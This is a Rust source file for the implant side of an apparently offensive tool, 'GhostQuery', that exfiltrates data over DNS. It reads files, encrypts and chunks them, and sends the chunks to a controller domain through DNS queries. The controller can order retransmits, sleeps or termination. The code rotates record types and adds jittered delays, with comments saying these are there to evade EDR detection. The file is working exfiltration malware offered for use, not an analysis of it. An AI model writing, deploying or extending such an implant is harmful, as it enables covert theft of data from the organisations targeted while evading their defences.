//! Implant client implementation.
//!
//! The implant operates as the "writer" in the ADSM model,
//! pushing data to the controller via DNS queries.

use std::io::{Read, Seek};
use std::path::Path;
use std::sync::Arc;
use std::time::Duration;

use parking_lot::RwLock;
use tokio::time::sleep;

use crate::common::constants::{DEFAULT_CHUNK_SIZE, DEFAULT_SLEEP_DURATION};
use crate::common::error::{GhostQueryError, Result};
use crate::common::types::{ChunkId, Command, DnsRecordType, SessionId};
use crate::crypto::keys::KeyManager;
use crate::encoding::GhostEncoder;
use crate::protocol::chunker::{ChunkedFile, FileChunker};
use crate::protocol::window::WindowController;
use crate::session::buffer::ChunkBuffer;
use crate::session::state::SessionStateMachine;
use crate::transport::dns::{DnsClient, DnsQuery, DnsResponse};

/// Configuration for the implant
#[derive(Debug, Clone)]
pub struct ImplantConfig {
    /// Target domain for exfiltration
    pub domain: String,
    /// Chunk size in bytes
    pub chunk_size: usize,
    /// Window size (outstanding chunks)
    pub window_size: usize,
    /// Base delay between queries (stealth)
    pub query_delay: Duration,
    /// Jitter factor (0.0-1.0) - actual delay will be base_delay * (1 +/- jitter)
    /// For example, 0.5 means delay varies from 50% to 150% of base delay
    /// This makes traffic patterns less detectable by EDR
    pub jitter: f64,
    /// Master key for encryption
    pub master_key: [u8; 32],
    /// DNS server to use (None = system resolver)
    pub dns_server: Option<std::net::SocketAddr>,
}

impl Default for ImplantConfig {
    fn default() -> Self {
        Self {
            domain: "ghost.local".to_string(),
            chunk_size: DEFAULT_CHUNK_SIZE,
            window_size: 16,
            query_delay: Duration::from_millis(40),
            jitter: 0.5, // 50% jitter means delays range from 20ms to 60ms
            master_key: [0u8; 32],
            dns_server: None,
        }
    }
}

impl ImplantConfig {
    /// Calculate a jittered delay for stealth
    /// Returns a random delay between base_delay * (1 - jitter) and base_delay * (1 + jitter)
    pub fn jittered_delay(&self) -> Duration {
        use rand::Rng;
        let base_ms = self.query_delay.as_millis() as f64;
        let min_ms = base_ms * (1.0 - self.jitter);
        let max_ms = base_ms * (1.0 + self.jitter);
        let jittered_ms = rand::thread_rng().gen_range(min_ms..=max_ms);
        Duration::from_millis(jittered_ms as u64)
    }
}

/// State of the implant
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ImplantState {
    /// Not connected
    Idle,
    /// Initializing session
    Initializing,
    /// Actively transmitting
    Transmitting,
    /// Paused (sleeping)
    Sleeping,
    /// Completing session
    Completing,
    /// Finished
    Done,
    /// Error state
    Error,
}

/// The implant client for data exfiltration
pub struct ImplantClient {
    /// Configuration
    config: ImplantConfig,
    /// Current state
    state: Arc<RwLock<ImplantState>>,
    /// Session state machine
    session: Arc<RwLock<SessionStateMachine>>,
    /// Chunk buffer
    buffer: Arc<RwLock<ChunkBuffer>>,
    /// Window controller
    window: Arc<RwLock<WindowController>>,
    /// Key manager
    keys: KeyManager,
    /// Encoder
    encoder: GhostEncoder,
    /// Current session ID
    session_id: Arc<RwLock<Option<SessionId>>>,
    /// Current record type for rotation
    current_record_type: Arc<RwLock<DnsRecordType>>,
    /// Statistics
    stats: Arc<RwLock<ImplantStats>>,
}

/// Statistics about implant operations
#[derive(Debug, Clone, Default)]
pub struct ImplantStats {
    pub chunks_sent: u64,
    pub chunks_acked: u64,
    pub retransmits: u64,
    pub bytes_sent: u64,
    pub queries_made: u64,
    pub errors: u64,
}

impl ImplantClient {
    /// Create a new implant client
    pub fn new(config: ImplantConfig) -> Self {
        let keys = KeyManager::from_key(config.master_key);

        Self {
            config,
            state: Arc::new(RwLock::new(ImplantState::Idle)),
            session: Arc::new(RwLock::new(SessionStateMachine::new())),
            buffer: Arc::new(RwLock::new(ChunkBuffer::new())),
            window: Arc::new(RwLock::new(WindowController::new())),
            keys,
            encoder: GhostEncoder::new(),
            session_id: Arc::new(RwLock::new(None)),
            current_record_type: Arc::new(RwLock::new(DnsRecordType::A)),
            stats: Arc::new(RwLock::new(ImplantStats::default())),
        }
    }

    /// Get current state
    pub fn state(&self) -> ImplantState {
        *self.state.read()
    }

    /// Get statistics
    pub fn stats(&self) -> ImplantStats {
        self.stats.read().clone()
    }

    /// Exfiltrate a file
    pub async fn exfiltrate_file<P: AsRef<Path>>(&self, path: P) -> Result<()> {
        let file = std::fs::File::open(path.as_ref())
            .map_err(|e| GhostQueryError::FileReadError(e.to_string()))?;

        let mut reader = std::io::BufReader::new(file);
        self.exfiltrate_reader(&mut reader).await
    }

    /// Exfiltrate from a reader
    pub async fn exfiltrate_reader<R: Read + Seek>(&self, reader: &mut R) -> Result<()> {
        // Generate session ID
        let session_id = SessionId::new();
        *self.session_id.write() = Some(session_id);

        // Create cipher for this session
        let cipher = self.keys.cipher_for_session(session_id.as_bytes())?;

        // Chunk the file
        let chunker = FileChunker::with_chunk_size(self.config.chunk_size)
            .with_encryption(cipher.clone(), *session_id.as_bytes());

        let chunked = chunker.chunk_file(reader)?;

        // Exfiltrate the chunked data
        self.exfiltrate_chunked(session_id, chunked).await
    }

    /// Exfiltrate raw data
    pub async fn exfiltrate_data(&self, data: &[u8]) -> Result<()> {
        let session_id = SessionId::new();
        *self.session_id.write() = Some(session_id);

        let cipher = self.keys.cipher_for_session(session_id.as_bytes())?;

        let chunker = FileChunker::with_chunk_size(self.config.chunk_size)
            .with_encryption(cipher.clone(), *session_id.as_bytes());

        let chunked = chunker.chunk_data(data)?;
        self.exfiltrate_chunked(session_id, chunked).await
    }

    /// Exfiltrate chunked data
    async fn exfiltrate_chunked(&self, session_id: SessionId, chunked: ChunkedFile) -> Result<()> {
        *self.state.write() = ImplantState::Initializing;

        // Create DNS client
        let dns_client = if let Some(server) = self.config.dns_server {
            DnsClient::with_server(server).await?
        } else {
            DnsClient::new().await?
        };

        // Initialize session on controller
        self.initialize_session(&dns_client, session_id, &chunked)
            .await?;

        // Load chunks into buffer
        {
            let mut buffer = self.buffer.write();
            for chunk in &chunked.chunks {
                buffer.add_chunk(chunk.clone());
            }
            buffer.open_window();
        }

        // Open window controller
        {
            let mut window = self.window.write();
            window.open();
        }

        *self.state.write() = ImplantState::Transmitting;

        // Transmit all chunks
        self.transmit_loop(&dns_client, session_id).await?;

        // Complete session
        *self.state.write() = ImplantState::Completing;
        self.complete_session(&dns_client, session_id).await?;

        *self.state.write() = ImplantState::Done;
        Ok(())
    }

    /// Initialize session with controller
    async fn initialize_session(
        &self,
        client: &DnsClient,
        session_id: SessionId,
        chunked: &ChunkedFile,
    ) -> Result<()> {
        let file_hash = chunked.file_hash.to_hex();
        let total_chunks = chunked.total_chunks();
        let query = DnsQuery::session_init(session_id, &file_hash, total_chunks, &self.config.domain);

        let response = client.send(&query).await?;

        if response.is_ack() || response.command() == Command::SessionAck {
            // Initialize session state machine
            let metadata = crate::common::types::SessionMetadata::new(
                session_id,
                chunked.file_hash.clone(),
                chunked.total_chunks(),
                chunked.chunk_size,
                chunked.file_size,
            );

            let mut session = self.session.write();
            session.allocate(metadata)?;
            session.start()?;

            Ok(())
        } else {
            Err(GhostQueryError::DnsQueryError(
                "Session initialization failed".to_string(),
            ))
        }
    }

    /// Main transmission loop
    async fn transmit_loop(&self, client: &DnsClient, session_id: SessionId) -> Result<()> {
        loop {
            // Check if all chunks are acknowledged
            if self.buffer.read().all_acknowledged() {
                break;
            }

            // Get next chunk to send
            let chunk = {
                let mut buffer = self.buffer.write();
                match buffer.next_to_send() {
                    Ok(Some(chunk)) => chunk,
                    Ok(None) => {
                        // No chunks ready, wait a bit
                        drop(buffer);
                        sleep(Duration::from_millis(50)).await;
                        continue;
                    }
                    Err(GhostQueryError::WindowFull) => {
                        drop(buffer);
                        sleep(Duration::from_millis(50)).await;
                        continue;
                    }
                    Err(GhostQueryError::WindowClosed) => {
                        // Wait for window to open
                        drop(buffer);
                        sleep(Duration::from_millis(100)).await;
                        continue;
                    }
                    Err(e) => return Err(e),
                }
            };

            // Get current record type and rotate
            let record_type = {
                let mut rt = self.current_record_type.write();
                let current = *rt;
                *rt = rt.next();
                current
            };

            // Build and send query
            let query = DnsQuery::from_chunk(&chunk, session_id, &self.config.domain, record_type)?;

            {
                let mut stats = self.stats.write();
                stats.queries_made += 1;
                stats.bytes_sent += chunk.data.len() as u64;
            }

            let response = client.send(&query).await;

            match response {
                Ok(resp) => {
                    self.handle_response(&resp, chunk.id).await?;
                }
                Err(GhostQueryError::Timeout) => {
                    // Mark chunk as dirty for retransmission
                    self.buffer.write().mark_dirty(chunk.id)?;
                    self.stats.write().errors += 1;
                }
                Err(e) => {
                    self.stats.write().errors += 1;
                    return Err(e);
                }
            }

            // Stealth delay with jitter to avoid detection patterns
            sleep(self.config.jittered_delay()).await;
        }

        Ok(())
    }

    /// Handle a DNS response
    async fn handle_response(&self, response: &DnsResponse, chunk_id: ChunkId) -> Result<()> {
        match response.command() {
            Command::Ack => {
                // Chunk acknowledged
                self.buffer.write().acknowledge(chunk_id)?;
                self.window.write().mark_acked(chunk_id);
                self.session.write().chunk_acked(chunk_id)?;

                let mut stats = self.stats.write();
                stats.chunks_sent += 1;
                stats.chunks_acked += 1;
            }
            Command::Retransmit => {
                // Retransmit requested
                if let Some(retx_id) = response.retransmit_chunk() {
                    self.buffer.write().mark_dirty(retx_id)?;
                    self.window.write().mark_dirty(retx_id);
                    self.session.write().mark_dirty(retx_id)?;
                    self.stats.write().retransmits += 1;
                }
            }
            Command::Sleep => {
                // Sleep requested
                let duration = response
                    .sleep_duration()
                    .unwrap_or(DEFAULT_SLEEP_DURATION as u32);

                *self.state.write() = ImplantState::Sleeping;
                sleep(Duration::from_secs(duration as u64)).await;
                *self.state.write() = ImplantState::Transmitting;
            }
            Command::Terminate => {
                // Terminate session
                self.session.write().terminate()?;
                *self.state.write() = ImplantState::Error;
                return Err(GhostQueryError::InternalError(
                    "Controller terminated session".to_string(),
                ));
            }
            _ => {
                // Unknown command, treat as ACK
                self.buffer.write().acknowledge(chunk_id)?;
            }
        }

        Ok(())
    }

    /// Complete the session
    async fn complete_session(&self, client: &DnsClient, session_id: SessionId) -> Result<()> {
        let query = DnsQuery::session_complete(session_id, &self.config.domain);
        let response = client.send(&query).await?;

        if response.is_complete() || response.is_ack() {
            self.session.write().start_verification()?;
            self.session.write().complete()?;
            Ok(())
        } else {
            Err(GhostQueryError::InternalError(
                "Session completion failed".to_string(),
            ))
        }
    }

    /// Get session ID
    pub fn session_id(&self) -> Option<SessionId> {
        *self.session_id.read()
    }

    /// Get buffer stats
    pub fn buffer_stats(&self) -> crate::session::buffer::BufferStats {
        self.buffer.read().stats()
    }

    /// Get window stats
    pub fn window_stats(&self) -> crate::protocol::window::WindowStats {
        self.window.read().stats()
    }

    /// Abort the current session
    pub fn abort(&self) {
        *self.state.write() = ImplantState::Error;
        if let Ok(()) = self.session.write().terminate() {}
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_config_default() {
        let config = ImplantConfig::default();
        assert_eq!(config.chunk_size, DEFAULT_CHUNK_SIZE);
    }

    #[test]
    fn test_client_creation() {
        let config = ImplantConfig::default();
        let client = ImplantClient::new(config);

        assert_eq!(client.state(), ImplantState::Idle);
    }

    #[test]
    fn test_stats() {
        let config = ImplantConfig::default();
        let client = ImplantClient::new(config);

        let stats = client.stats();
        assert_eq!(stats.chunks_sent, 0);
        assert_eq!(stats.queries_made, 0);
    }
}

